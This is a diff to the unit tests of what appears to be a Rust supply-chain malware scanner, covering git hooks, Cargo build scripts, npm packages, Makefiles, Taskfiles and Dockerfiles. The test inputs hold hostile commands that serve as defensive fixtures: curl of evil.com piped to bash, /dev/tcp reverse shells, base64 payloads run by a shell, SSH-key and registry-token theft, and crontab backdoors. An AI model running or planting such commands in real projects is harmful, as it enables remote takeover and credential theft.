+        let findings =
+            scan_git_hooks_with(&[("not-a-real-hook", "#!/bin/sh\necho hi")], None, None);
         assert!(has_description_containing(&findings, "Unknown hook name"));
     }
 
@@ -2595,24 +3360,36 @@ mod tests {
             None,
             None,
         );
-        assert!(has_description_containing(&findings, "Network download command"));
+        assert!(has_description_containing(
+            &findings,
+            "Network download command"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn git_hook_with_reverse_shell_is_critical() {
         let findings = scan_git_hooks_with(
-            &[("post-commit", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1")],
+            &[(
+                "post-commit",
+                "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            )],
             None,
             None,
         );
-        assert!(has_description_containing(&findings, "/dev/tcp redirection"));
+        assert!(has_description_containing(
+            &findings,
+            "/dev/tcp redirection"
+        ));
     }
 
     #[test]
     fn git_hook_with_base64_decode_is_high() {
         let findings = scan_git_hooks_with(
-            &[("pre-commit", "#!/bin/bash\necho aGVsbG8= | base64 --decode | sh")],
+            &[(
+                "pre-commit",
+                "#!/bin/bash\necho aGVsbG8= | base64 --decode | sh",
+            )],
             None,
             None,
         );
@@ -2623,22 +3400,21 @@ mod tests {
     fn git_hook_obfuscated_long_line_is_high() {
         let long_line = "x".repeat(600);
         let content = format!("#!/bin/bash\n{}", long_line);
-        let findings = scan_git_hooks_with(
-            &[("pre-commit", &content)],
-            None,
-            None,
-        );
-        assert!(has_description_containing(&findings, "Extremely long line in hook script"));
+        let findings = scan_git_hooks_with(&[("pre-commit", &content)], None, None);
+        assert!(has_description_containing(
+            &findings,
+            "Extremely long line in hook script"
+        ));
     }
 
     #[test]
     fn git_config_hooks_path_redirect_is_high() {
-        let findings = scan_git_hooks_with(
-            &[],
-            Some("[core]\n\thooksPath = /tmp/evil-hooks"),
-            None,
-        );
-        assert!(has_description_containing(&findings, "core.hooksPath redirects hooks to"));
+        let findings =
+            scan_git_hooks_with(&[], Some("[core]\n\thooksPath = /tmp/evil-hooks"), None);
+        assert!(has_description_containing(
+            &findings,
+            "core.hooksPath redirects hooks to"
+        ));
         assert!(has_severity(&findings, "High"));
     }
 
@@ -2647,10 +3423,19 @@ mod tests {
         let findings = scan_git_hooks_with(
             &[],
             None,
-            Some((".githooks", &[("pre-commit", "#!/bin/sh\necho shared hook")])),
+            Some((
+                ".githooks",
+                &[("pre-commit", "#!/bin/sh\necho shared hook")],
+            )),
         );
-        assert!(has_description_containing(&findings, "Shared hooks directory"));
-        assert!(has_description_containing(&findings, "runs automatically on common git operations"));
+        assert!(has_description_containing(
+            &findings,
+            "Shared hooks directory"
+        ));
+        assert!(has_description_containing(
+            &findings,
+            "runs automatically on common git operations"
+        ));
     }
 
     #[test]
@@ -2658,30 +3443,51 @@ mod tests {
         let findings = scan_git_hooks_with(
             &[],
             None,
-            Some((".githooks", &[("post-merge", "#!/bin/bash\ncurl http://evil.com/steal | bash")])),
+            Some((
+                ".githooks",
+                &[(
+                    "post-merge",
+                    "#!/bin/bash\ncurl http://evil.com/steal | bash",
+                )],
+            )),
         );
-        assert!(has_description_containing(&findings, "Network download command"));
+        assert!(has_description_containing(
+            &findings,
+            "Network download command"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn git_hook_stealing_ssh_keys_is_high() {
         let findings = scan_git_hooks_with(
-            &[("post-checkout", "#!/bin/bash\ntar czf /tmp/keys.tar.gz ~/.ssh/")],
+            &[(
+                "post-checkout",
+                "#!/bin/bash\ntar czf /tmp/keys.tar.gz ~/.ssh/",
+            )],
             None,
             None,
         );
-        assert!(has_description_containing(&findings, "Reference to sensitive config"));
+        assert!(has_description_containing(
+            &findings,
+            "Reference to sensitive config"
+        ));
     }
 
     #[test]
     fn git_hook_with_persistence_is_high() {
         let findings = scan_git_hooks_with(
-            &[("post-merge", "#!/bin/bash\ncrontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -")],
+            &[(
+                "post-merge",
+                "#!/bin/bash\ncrontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -",
+            )],
             None,
             None,
         );
-        assert!(has_description_containing(&findings, "Persistence mechanism"));
+        assert!(has_description_containing(
+            &findings,
+            "Persistence mechanism"
+        ));
     }
 
     #[test]
@@ -2693,24 +3499,43 @@ mod tests {
         fs::write(git_hooks.join("pre-commit.sample"), "#!/bin/sh\nexit 0").unwrap();
         fs::write(git_hooks.join("pre-push.sample"), "#!/bin/sh\nexit 0").unwrap();
         let findings = scan_git_hooks(dir.path(), false);
-        assert!(findings.is_empty(), "Clean repo with only sample hooks should have no findings");
+        assert!(
+            findings.is_empty(),
+            "Clean repo with only sample hooks should have no findings"
+        );
     }
 
     #[test]
     fn git_full_malicious_hooks_scan() {
         let findings = scan_git_hooks_with(
             &[
-                ("pre-commit", "#!/bin/bash\ncurl http://evil.com/payload | bash"),
-                ("post-checkout", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+                (
+                    "pre-commit",
+                    "#!/bin/bash\ncurl http://evil.com/payload | bash",
+                ),
+                (
+                    "post-checkout",
+                    "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+                ),
             ],
             Some("[core]\n\thooksPath = /tmp/evil"),
-            Some((".githooks", &[("post-merge", "#!/bin/bash\nwget http://evil.com/miner -O /tmp/m && chmod +x /tmp/m")])),
+            Some((
+                ".githooks",
+                &[(
+                    "post-merge",
+                    "#!/bin/bash\nwget http://evil.com/miner -O /tmp/m && chmod +x /tmp/m",
+                )],
+            )),
         );
         let critical_count = findings
             .iter()
             .filter(|f| matches!(f.severity, Severity::Critical))
             .count();
-        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
+        assert!(
+            critical_count >= 3,
+            "Expected at least 3 critical findings, got {}",
+            critical_count
+        );
     }
 
     // ---- Cargo build script helpers ----
@@ -2738,21 +3563,26 @@ mod tests {
 
     #[test]
     fn build_script_benign_cc_is_low_risk() {
-        let findings = analyze_build_script_content("some-sys", r#"
+        let findings = analyze_build_script_content(
+            "some-sys",
+            r#"
 fn main() {
     cc::Build::new()
         .file("src/foo.c")
         .compile("foo");
     println!("cargo:rerun-if-changed=src/foo.c");
 }
-"#);
+"#,
+        );
         assert!(!has_severity(&findings, "Critical"));
         assert!(!has_severity(&findings, "High"));
     }
 
     #[test]
     fn build_script_command_new_is_flagged() {
-        let findings = analyze_build_script_content("sketchy-crate", r#"
+        let findings = analyze_build_script_content(
+            "sketchy-crate",
+            r#"
 use std::process::Command;
 fn main() {
     Command::new("cmake")
@@ -2760,13 +3590,19 @@ fn main() {
         .status()
         .unwrap();
 }
-"#);
-        assert!(has_description_containing(&findings, "Command execution in build script"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "Command execution in build script"
+        ));
     }
 
     #[test]
     fn build_script_spawns_curl_is_critical() {
-        let findings = analyze_build_script_content("evil-crate", r#"
+        let findings = analyze_build_script_content(
+            "evil-crate",
+            r#"
 use std::process::Command;
 fn main() {
     Command::new("curl")
@@ -2774,14 +3610,20 @@ fn main() {
         .status()
         .unwrap();
 }
-"#);
-        assert!(has_description_containing(&findings, "spawns network/shell/scripting command"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "spawns network/shell/scripting command"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn build_script_spawns_bash_is_critical() {
-        let findings = analyze_build_script_content("evil-crate", r#"
+        let findings = analyze_build_script_content(
+            "evil-crate",
+            r#"
 use std::process::Command;
 fn main() {
     Command::new("bash")
@@ -2790,13 +3632,19 @@ fn main() {
         .status()
         .unwrap();
 }
-"#);
-        assert!(has_description_containing(&findings, "spawns network/shell/scripting command"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "spawns network/shell/scripting command"
+        ));
     }
 
     #[test]
     fn build_script_spawns_python_is_critical() {
-        let findings = analyze_build_script_content("sneaky-crate", r#"
+        let findings = analyze_build_script_content(
+            "sneaky-crate",
+            r#"
 use std::process::Command;
 fn main() {
     Command::new("python")
@@ -2804,105 +3652,157 @@ fn main() {
         .status()
         .unwrap();
 }
-"#);
-        assert!(has_description_containing(&findings, "spawns network/shell/scripting command"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "spawns network/shell/scripting command"
+        ));
     }
 
     #[test]
     fn build_script_network_library_is_critical() {
-        let findings = analyze_build_script_content("evil-crate", r#"
+        let findings = analyze_build_script_content(
+            "evil-crate",
+            r#"
 fn main() {
     let resp = reqwest::blocking::get("http://evil.com/config").unwrap();
     std::fs::write("/tmp/config", resp.bytes().unwrap()).unwrap();
 }
-"#);
-        assert!(has_description_containing(&findings, "Network library usage in build script"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "Network library usage in build script"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn build_script_tcp_stream_is_critical() {
-        let findings = analyze_build_script_content("evil-crate", r#"
+        let findings = analyze_build_script_content(
+            "evil-crate",
+            r#"
 use std::net::TcpStream;
 fn main() {
     let _stream = TcpStream::connect("evil.com:4444").unwrap();
 }
-"#);
-        assert!(has_description_containing(&findings, "Raw network socket in build script"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "Raw network socket in build script"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn build_script_home_dir_access_is_high() {
-        let findings = analyze_build_script_content("evil-crate", r#"
+        let findings = analyze_build_script_content(
+            "evil-crate",
+            r#"
 fn main() {
     let home = dirs::home_dir().unwrap();
     let data = std::fs::read_to_string(home.join(".bashrc")).unwrap();
     println!("{}", data);
 }
-"#);
+"#,
+        );
         // The pattern matches "home_dir" substring
-        assert!(has_description_containing(&findings, "Build script accesses home directory"));
+        assert!(has_description_containing(
+            &findings,
+            "Build script accesses home directory"
+        ));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn build_script_reads_ssh_keys_is_critical() {
-        let findings = analyze_build_script_content("evil-crate", r#"
+        let findings = analyze_build_script_content(
+            "evil-crate",
+            r#"
 fn main() {
     let key = std::fs::read_to_string(
         std::path::Path::new(&std::env::var("HOME").unwrap()).join(".ssh/id_rsa")
     ).unwrap();
 }
-"#);
-        assert!(has_description_containing(&findings, "references sensitive config file"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "references sensitive config file"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn build_script_reads_cargo_credentials_is_critical() {
-        let findings = analyze_build_script_content("evil-crate", r#"
+        let findings = analyze_build_script_content(
+            "evil-crate",
+            r#"
 fn main() {
     let token = std::env::var("CARGO_REGISTRY_TOKEN").unwrap();
     // exfiltrate token
 }
-"#);
-        assert!(has_description_containing(&findings, "cargo registry credentials"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "cargo registry credentials"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn build_script_chmod_is_high() {
-        let findings = analyze_build_script_content("sketchy-crate", r#"
+        let findings = analyze_build_script_content(
+            "sketchy-crate",
+            r#"
 use std::os::unix::fs::PermissionsExt;
 fn main() {
     let perms = std::fs::Permissions::from_mode(0o755);
     std::fs::set_permissions("/tmp/binary", perms).unwrap();
 }
-"#);
-        assert!(has_description_containing(&findings, "modifies file permissions"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "modifies file permissions"
+        ));
     }
 
     #[test]
     fn build_script_dlopen_is_high() {
-        let findings = analyze_build_script_content("sketchy-crate", r#"
+        let findings = analyze_build_script_content(
+            "sketchy-crate",
+            r#"
 fn main() {
     let lib = libloading::Library::new("/tmp/evil.so").unwrap();
 }
-"#);
-        assert!(has_description_containing(&findings, "Dynamic library loading"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "Dynamic library loading"
+        ));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn build_script_env_identity_is_medium() {
-        let findings = analyze_build_script_content("curious-crate", r#"
+        let findings = analyze_build_script_content(
+            "curious-crate",
+            r#"
 fn main() {
     let user = std::env::var("USER").unwrap();
     println!("cargo:warning=building for {}", user);
 }
-"#);
-        assert!(has_description_containing(&findings, "reads identity/environment info"));
+"#,
+        );
+        assert!(has_description_containing(
+            &findings,
+            "reads identity/environment info"
+        ));
     }
 
     #[test]
@@ -2910,24 +3810,32 @@ fn main() {
         let long_line = format!("let x = \"{}\";", "A".repeat(600));
         let content = format!("fn main() {{\n    {}\n}}", long_line);
         let findings = analyze_build_script_content("obfuscated-crate", &content);
-        assert!(has_description_containing(&findings, "Extremely long line in build script"));
+        assert!(has_description_containing(
+            &findings,
+            "Extremely long line in build script"
+        ));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn build_script_include_bytes_is_medium() {
-        let findings = analyze_build_script_content("embed-crate", r#"
+        let findings = analyze_build_script_content(
+            "embed-crate",
+            r#"
 fn main() {
     let data = include_bytes!("blob.bin");
     std::fs::write(std::env::var("OUT_DIR").unwrap() + "/blob.bin", data).unwrap();
 }
-"#);
+"#,
+        );
         assert!(has_description_containing(&findings, "include_bytes!"));
     }
 
     #[test]
     fn build_script_full_malicious() {
-        let findings = analyze_build_script_content("full-evil", r#"
+        let findings = analyze_build_script_content(
+            "full-evil",
+            r#"
 use std::process::Command;
 fn main() {
     // Steal SSH keys
@@ -2942,12 +3850,17 @@ fn main() {
         .status()
         .unwrap();
 }
-"#);
+"#,
+        );
         let critical_count = findings
             .iter()
             .filter(|f| matches!(f.severity, Severity::Critical))
             .count();
-        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
+        assert!(
+            critical_count >= 3,
+            "Expected at least 3 critical findings, got {}",
+            critical_count
+        );
     }
 
     // ---- Semgrep JSON parsing tests ----
@@ -3084,7 +3997,10 @@ fn main() {
         }"#;
         let findings = parse_semgrep_json(json);
         assert_eq!(findings[0].line_number, Some(42));
-        assert_eq!(findings[0].matched_content.as_deref(), Some("os.system(cmd)"));
+        assert_eq!(
+            findings[0].matched_content.as_deref(),
+            Some("os.system(cmd)")
+        );
     }
 
     // ---- OSV-scanner JSON parsing tests ----
@@ -3233,8 +4149,8 @@ fn main() {
         assert!(has_description_containing(&findings, "crate-a"));
         assert!(has_description_containing(&findings, "crate-b"));
         assert!(has_severity(&findings, "Critical")); // 9.0
-        assert!(has_severity(&findings, "High"));     // 7.5
-        assert!(has_severity(&findings, "Medium"));   // 5.0
+        assert!(has_severity(&findings, "High")); // 7.5
+        assert!(has_severity(&findings, "Medium")); // 5.0
     }
 
     #[test]
@@ -3277,6 +4193,19 @@ fn main() {
         }
 
         scan_npm_packages(dir.path(), false)
+    }
+
+    /// Create a temp dir with build orchestration files and run build-orchestration scan.
+    fn scan_build_orchestration_with(files: &[(&str, &str)]) -> Vec<Finding> {
+        let dir = tempfile::tempdir().unwrap();
+        for (rel, content) in files {
+            let path = dir.path().join(rel);
+            if let Some(parent) = path.parent() {
+                fs::create_dir_all(parent).unwrap();
+            }
+            fs::write(path, content).unwrap();
+        }
+        scan_build_orchestration_files(dir.path(), false)
     }
 
     // ---- Edit distance tests ----
@@ -3335,84 +4264,117 @@ fn main() {
 
     #[test]
     fn npm_root_postinstall_is_flagged() {
-        let findings = scan_npm_with(r#"{
+        let findings = scan_npm_with(
+            r#"{
             "name": "my-project",
             "scripts": {
                 "postinstall": "echo setup done"
             }
-        }"#, &[]);
-        assert!(has_description_containing(&findings, "lifecycle script 'postinstall'"));
+        }"#,
+            &[],
+        );
+        assert!(has_description_containing(
+            &findings,
+            "lifecycle script 'postinstall'"
+        ));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn npm_root_preinstall_is_flagged() {
-        let findings = scan_npm_with(r#"{
+        let findings = scan_npm_with(
+            r#"{
             "name": "my-project",
             "scripts": {
                 "preinstall": "node setup.js"
             }
-        }"#, &[]);
-        assert!(has_description_containing(&findings, "lifecycle script 'preinstall'"));
+        }"#,
+            &[],
+        );
+        assert!(has_description_containing(
+            &findings,
+            "lifecycle script 'preinstall'"
+        ));
         assert!(has_severity(&findings, "High"));
     }
 
     #[test]
     fn npm_root_prepare_is_medium() {
-        let findings = scan_npm_with(r#"{
+        let findings = scan_npm_with(
+            r#"{
             "name": "my-project",
             "scripts": {
                 "prepare": "husky install"
             }
-        }"#, &[]);
-        assert!(has_description_containing(&findings, "lifecycle script 'prepare'"));
+        }"#,
+            &[],
+        );
+        assert!(has_description_containing(
+            &findings,
+            "lifecycle script 'prepare'"
+        ));
         assert!(has_severity(&findings, "Medium"));
     }
 
     #[test]
     fn npm_no_lifecycle_scripts_is_clean() {
-        let findings = scan_npm_with(r#"{
+        let findings = scan_npm_with(
+            r#"{
             "name": "my-project",
             "scripts": {
                 "start": "node index.js",
                 "test": "jest",
                 "build": "webpack"
             }
-        }"#, &[]);
+        }"#,
+            &[],
+        );
         assert!(findings.is_empty());
     }
 
     #[test]
     fn npm_postinstall_with_curl_is_critical() {
-        let findings = scan_npm_with(r#"{
+        let findings = scan_npm_with(
+            r#"{
             "name": "evil-pkg",
             "scripts": {
                 "postinstall": "curl http://evil.com/payload | bash"
             }
-        }"#, &[]);
-        assert!(has_description_containing(&findings, "Network download command"));
+        }"#,
+            &[],
+        );
+        assert!(has_description_containing(
+            &findings,
+            "Network download command"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn npm_postinstall_with_eval_is_high() {
-        let findings = scan_npm_with(r#"{
+        let findings = scan_npm_with(
+            r#"{
             "name": "evil-pkg",
             "scripts": {
                 "postinstall": "node -e \"eval(require('child_process').execSync('curl http://evil.com'))\""
             }
-        }"#, &[]);
+        }"#,
+            &[],
+        );
         assert!(has_description_containing(&findings, "eval()"));
     }
 
     #[test]
     fn npm_postinstall_with_base64_is_high() {
-        let findings = scan_npm_with(r#"{
+        let findings = scan_npm_with(
+            r#"{
             "name": "evil-pkg",
             "scripts": {
                 "postinstall": "echo aGVsbG8= | base64 --decode | sh"
             }
-        }"#, &[]);
+        }"#,
+            &[],
+        );
         assert!(has_description_containing(&findings, "Base64 decode"));
     }
 
@@ -3420,12 +4382,15 @@ fn main() {
 
     #[test]
     fn npm_typosquat_dependency_is_flagged() {
-        let findings = scan_npm_with(r#"{
+        let findings = scan_npm_with(
+            r#"{
             "name": "my-project",
             "dependencies": {
                 "expresz": "^4.0.0"
             }
-        }"#, &[]);
+        }"#,
+            &[],
+        );
         assert!(has_description_containing(&findings, "typosquat"));
         assert!(has_description_containing(&findings, "express"));
         assert!(has_severity(&findings, "High"));
@@ -3433,26 +4398,32 @@ fn main() {
 
     #[test]
     fn npm_typosquat_in_dev_dependencies() {
-        let findings = scan_npm_with(r#"{
+        let findings = scan_npm_with(
+            r#"{
             "name": "my-project",
             "devDependencies": {
                 "expresss": "^4.0.0"
             }
-        }"#, &[]);
+        }"#,
+            &[],
+        );
         assert!(has_description_containing(&findings, "typosquat"));
         assert!(has_description_containing(&findings, "devDependencies"));
     }
 
     #[test]
     fn npm_legitimate_deps_no_typosquat() {
-        let findings = scan_npm_with(r#"{
+        let findings = scan_npm_with(
+            r#"{
             "name": "my-project",
             "dependencies": {
                 "express": "^4.0.0",
                 "lodash": "^4.17.0",
                 "react": "^18.0.0"
             }
-        }"#, &[]);
+        }"#,
+            &[],
+        );
         assert!(!has_description_containing(&findings, "typosquat"));
     }
 
@@ -3462,32 +4433,44 @@ fn main() {
     fn npm_dep_with_postinstall_is_flagged() {
         let findings = scan_npm_with(
             r#"{"name": "my-project", "dependencies": {"sketchy": "1.0.0"}}"#,
-            &[("sketchy", r#"{
+            &[(
+                "sketchy",
+                r#"{
                 "name": "sketchy",
                 "version": "1.0.0",
                 "scripts": {
                     "postinstall": "node install.js"
                 }
-            }"#)],
+            }"#,
+            )],
         );
         assert!(has_description_containing(&findings, "dep:sketchy"));
-        assert!(has_description_containing(&findings, "lifecycle script 'postinstall'"));
+        assert!(has_description_containing(
+            &findings,
+            "lifecycle script 'postinstall'"
+        ));
     }
 
     #[test]
     fn npm_dep_postinstall_curl_is_critical() {
         let findings = scan_npm_with(
             r#"{"name": "my-project", "dependencies": {"evil-dep": "1.0.0"}}"#,
-            &[("evil-dep", r#"{
+            &[(
+                "evil-dep",
+                r#"{
                 "name": "evil-dep",
                 "version": "1.0.0",
                 "scripts": {
                     "preinstall": "curl http://evil.com/steal | bash"
                 }
-            }"#)],
+            }"#,
+            )],
         );
         assert!(has_description_containing(&findings, "dep:evil-dep"));
-        assert!(has_description_containing(&findings, "Network download command"));
+        assert!(has_description_containing(
+            &findings,
+            "Network download command"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
@@ -3495,13 +4478,16 @@ fn main() {
     fn npm_dep_no_scripts_is_clean() {
         let findings = scan_npm_with(
             r#"{"name": "my-project", "dependencies": {"safe-dep": "1.0.0"}}"#,
-            &[("safe-dep", r#"{
+            &[(
+                "safe-dep",
+                r#"{
                 "name": "safe-dep",
                 "version": "1.0.0",
                 "scripts": {
                     "test": "jest"
                 }
-            }"#)],
+            }"#,
+            )],
         );
         // No lifecycle scripts, no typosquat
         assert!(!has_description_containing(&findings, "dep:safe-dep"));
@@ -3511,16 +4497,22 @@ fn main() {
     fn npm_scoped_dep_with_postinstall() {
         let findings = scan_npm_with(
             r#"{"name": "my-project", "dependencies": {"@evil/pkg": "1.0.0"}}"#,
-            &[("@evil/pkg", r#"{
+            &[(
+                "@evil/pkg",
+                r#"{
                 "name": "@evil/pkg",
                 "version": "1.0.0",
                 "scripts": {
                     "postinstall": "node malware.js"
                 }
-            }"#)],
+            }"#,
+            )],
         );
         assert!(has_description_containing(&findings, "dep:@evil/pkg"));
-        assert!(has_description_containing(&findings, "lifecycle script 'postinstall'"));
+        assert!(has_description_containing(
+            &findings,
+            "lifecycle script 'postinstall'"
+        ));
     }
 
     // ---- npm full integration ----
@@ -3538,22 +4530,100 @@ fn main() {
                     "postinstall": "curl http://evil.com/rootkit | bash"
                 }
             }"#,
-            &[("evil-dep", r#"{
+            &[(
+                "evil-dep",
+                r#"{
                 "name": "evil-dep",
                 "version": "1.0.0",
                 "scripts": {
                     "preinstall": "powershell -enc SGVsbG8=",
                     "postinstall": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
                 }
-            }"#)],
+            }"#,
+            )],
         );
         let critical_count = findings
             .iter()
             .filter(|f| matches!(f.severity, Severity::Critical))
             .count();
-        assert!(critical_count >= 2, "Expected at least 2 critical findings, got {}", critical_count);
+        assert!(
+            critical_count >= 2,
+            "Expected at least 2 critical findings, got {}",
+            critical_count
+        );
         assert!(has_description_containing(&findings, "typosquat"));
         assert!(has_description_containing(&findings, "dep:evil-dep"));
+    }
+
+    // ---- Build orchestration tests (Makefile / npm scripts / task files) ----
+
+    #[test]
+    fn makefile_hidden_shell_curl_is_critical() {
+        let findings = scan_build_orchestration_with(&[(
+            "Makefile",
+            "build:\n\t@$(shell curl -fsSL http://evil.com/dropper.sh | sh)\n",
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "Hidden command expansion executes network downloader"
+        ));
+        assert!(has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn makefile_hidden_shell_cargo_is_high() {
+        let findings = scan_build_orchestration_with(&[(
+            "Makefile",
+            "build:\n\t@echo start\n\t@$(eval $(shell cargo build --release))\n",
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "Hidden command expansion builds tooling/compiler output"
+        ));
+        assert!(has_severity(&findings, "High"));
+    }
+
+    #[test]
+    fn makefile_plain_cargo_build_is_not_flagged_as_hidden() {
+        let findings =
+            scan_build_orchestration_with(&[("Makefile", "build:\n\tcargo build --release\n")]);
+        assert!(!has_description_containing(
+            &findings,
+            "Hidden command expansion"
+        ));
+        assert!(!has_description_containing(
+            &findings,
+            "Backtick command substitution"
+        ));
+    }
+
+    #[test]
+    fn npm_non_lifecycle_script_with_hidden_download_is_flagged() {
+        let findings = scan_build_orchestration_with(&[(
+            "package.json",
+            r#"{
+                "name": "demo",
+                "scripts": {
+                    "build": "node -e \"require('child_process').execSync('`curl -fsSL http://evil.com/p.sh | sh`')\"",
+                    "test": "jest"
+                }
+            }"#,
+        )]);
+        assert!(has_description_containing(&findings, "npm script 'build'"));
+        assert!(has_severity(&findings, "High") || has_severity(&findings, "Critical"));
+    }
+
+    #[test]
+    fn taskfile_base64_payload_is_critical() {
+        let findings = scan_build_orchestration_with(&[(
+            "Taskfile.yml",
+            "version: '3'\ntasks:\n  setup:\n    cmds:\n      - \"echo QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB | base64 --decode | bash\"\n",
+        )]);
+        assert!(has_description_containing(
+            &findings,
+            "Base64-decoded payload piped to shell in build file"
+        ));
+        assert!(has_severity(&findings, "Critical"));
     }
 
     // ---- Dockerfile helpers ----
@@ -3580,19 +4650,23 @@ fn main() {
 
     #[test]
     fn dockerfile_curl_pipe_bash_is_critical() {
-        let findings = analyze_dockerfile_str(
-            "FROM ubuntu\nRUN curl http://evil.com/install.sh | bash\n",
-        );
-        assert!(has_description_containing(&findings, "pipes download into shell"));
+        let findings =
+            analyze_dockerfile_str("FROM ubuntu\nRUN curl http://evil.com/install.sh | bash\n");
+        assert!(has_description_containing(
+            &findings,
+            "pipes download into shell"
+        ));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn dockerfile_wget_pipe_sh_is_critical() {
-        let findings = analyze_dockerfile_str(
-            "FROM alpine\nRUN wget http://evil.com/payload -O- | sh\n",
-        );
-        assert!(has_description_containing(&findings, "pipes download into shell"));
+        let findings =
+            analyze_dockerfile_str("FROM alpine\nRUN wget http://evil.com/payload -O- | sh\n");
+        assert!(has_description_containing(
+            &findings,
+            "pipes download into shell"
+        ));
     }
 
     #[test]
@@ -3606,26 +4680,23 @@ fn main() {
 
     #[test]
     fn dockerfile_add_remote_url_is_high() {
-        let findings = analyze_dockerfile_str(
-            "FROM ubuntu\nADD https://example.com/config.tar.gz /opt/\n",
-        );
+        let findings =
+            analyze_dockerfile_str("FROM ubuntu\nADD https://example.com/config.tar.gz /opt/\n");
         assert!(has_description_containing(&findings, "ADD from remote URL"));
     }
 
     #[test]
     fn dockerfile_reverse_shell_is_critical() {
-        let findings = analyze_dockerfile_str(
-            "FROM ubuntu\nRUN bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
-        );
+        let findings =
+            analyze_dockerfile_str("FROM ubuntu\nRUN bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");
         assert!(has_description_containing(&findings, "/dev/tcp"));
         assert!(has_severity(&findings, "Critical"));
     }
 
     #[test]
     fn dockerfile_base64_decode_is_high() {
-        let findings = analyze_dockerfile_str(
-            "FROM ubuntu\nRUN echo aGVsbG8= | base64 --decode | bash\n",
-        );
+        let findings =
+            analyze_dockerfile_str("FROM ubuntu\nRUN echo aGVsbG8= | base64 --decode | bash\n");
         assert!(has_description_containing(&findings, "decodes base64"));
     }
 
@@ -3639,9 +4710,7 @@ fn main() {
 
     #[test]
     fn dockerfile_user_root_is_medium() {
-        let findings = analyze_dockerfile_str(
-            "FROM ubuntu\nUSER root\nRUN apt-get update\n",
-        );
+        let findings = analyze_dockerfile_str("FROM ubuntu\nUSER root\nRUN apt-get update\n");
         assert!(has_description_containing(&findings, "runs as root"));
     }
 
@@ -3650,7 +4719,10 @@ fn main() {
         let findings = analyze_dockerfile_str(
             "FROM ubuntu\nRUN --mount=type=secret,id=mysecret cat /run/secrets/mysecret\n",
         );
-        assert!(has_description_containing(&findings, "mounts build secrets"));
+        assert!(has_description_containing(
+            &findings,
+            "mounts build secrets"
+        ));
     }
 
     #[test]
@@ -3671,25 +4743,25 @@ fn main() {
 
     #[test]
     fn dockerfile_env_path_override_is_medium() {
-        let findings = analyze_dockerfile_str(
-            "FROM ubuntu\nENV PATH=\"/malicious/bin:$PATH\"\n",
-        );
-        assert!(has_description_containing(&findings, "overrides sensitive ENV"));
+        let findings = analyze_dockerfile_str("FROM ubuntu\nENV PATH=\"/malicious/bin:$PATH\"\n");
+        assert!(has_description_containing(
+            &findings,
+            "overrides sensitive ENV"
+        ));
     }
 
     #[test]
     fn dockerfile_env_ld_preload_is_medium() {
-        let findings = analyze_dockerfile_str(
-            "FROM ubuntu\nENV LD_PRELOAD=\"/tmp/evil.so\"\n",
-        );
-        assert!(has_description_containing(&findings, "overrides sensitive ENV"));
+        let findings = analyze_dockerfile_str("FROM ubuntu\nENV LD_PRELOAD=\"/tmp/evil.so\"\n");
+        assert!(has_description_containing(
+            &findings,
+            "overrides sensitive ENV"
+        ));
     }
 
     #[test]
     fn dockerfile_from_latest_is_medium() {
-        let findings = analyze_dockerfile_str(
-            "FROM ubuntu:latest\nRUN echo hi\n",
-        );
+        let findings = analyze_dockerfile_str("FROM ubuntu:latest\nRUN echo hi\n");
         assert!(has_description_containing(&findings, "mutable tag"));
     }
 
@@ -3718,24 +4790,30 @@ fn main() {
 
     #[test]
     fn devcontainer_benign_is_clean() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
             "image": "mcr.microsoft.com/devcontainers/rust:1",
             "features": {
                 "ghcr.io/devcontainers/features/git:1": {}
             }
-        }"#, None);
+        }"#,
+            None,
+        );
         assert!(!has_severity(&findings, "Critical"));
         assert!(!has_severity(&findings, "High"));
     }
 
     #[test]
     fn devcontainer_initialize_command_is_critical() {
-        let findings = scan_devcontainer_with(r#"{
+        let findings = scan_devcontainer_with(
+            r#"{
             "name": "Dev",
